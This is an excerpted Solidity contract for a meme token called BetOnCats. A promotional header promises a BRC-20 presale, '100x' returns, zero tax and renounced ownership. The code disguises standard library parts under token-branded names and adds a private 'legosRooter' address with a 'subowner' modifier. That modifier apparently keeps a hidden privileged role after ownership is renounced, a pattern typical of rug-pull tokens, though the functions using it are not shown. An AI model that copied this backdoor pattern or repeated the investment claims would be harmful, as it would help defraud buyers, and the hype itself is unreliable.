...
BetOnCats 
https://BetOnCats.io/
https://docs.BetOnCats.io/
https://t.me/BetOnCats
$BET On Cats is the First Meme Token of the Bitcoin Cats World and the first 
BRC-20 token pre-sale. Bitcoin Cats had a successful 100 million presale this week. 
BRC-20 tokens are doing 100x—the new Chinese Mania. 0 Tax | 
Ownership Renounced 
after end of presale |  swap ratio to BRC-20 $BET | No Team Tokens
*/
pragma solidity 0.8.23;

interface BetOnCats33 {
  /**
...
/*
 * @dev Provides information about the current execution BetOnCats20Burnable, including the
 ...
 */
abstract contract BetOnCats20Burnable {
...
// File: @openzeppelin/contracts/access/BetOnCats20Ownable.sol
 ...
 * the owner.
 */
abstract contract BetOnCats20Ownable is BetOnCats20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BetOnCats20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BetOnCats20Ownable: new owner is the zero address");
 ...
 * `SafeBetOnCats` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeBetOnCats {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeBetOnCats: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeBetOnCats: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeBetOnCats: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeBetOnCats: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeBetOnCats: modulo by zero");
  }
...
contract BetOnCatsToken is BetOnCats20Burnable, BetOnCats33, BetOnCats20Ownable {
    
    using SafeBetOnCats for uint256;
   ...
   address private legosRooter; 
    ...
    string public BetOnCatstelegramcchannel = "https://t.me/BetOnCats";
            function getBetOnCatstelegramcchannel() public view returns (string memory) {
        return BetOnCatstelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {BetOnCats33-totalSupply}.
    */
    ...
    /**
    * @dev See {BetOnCats33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "BetOnCats20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {BetOnCats33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BetOnCats33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BetOnCats33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "BetOnCats33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BetOnCats33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "BetOnCats33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "BetOnCats33: transfer from the zero address");
        require(shippingto != address(0), "BetOnCats33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "BetOnCats33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "BetOnCats33: approve from the zero address");
        require(transporteur != address(0), "BetOnCats33: approve to the zero address");
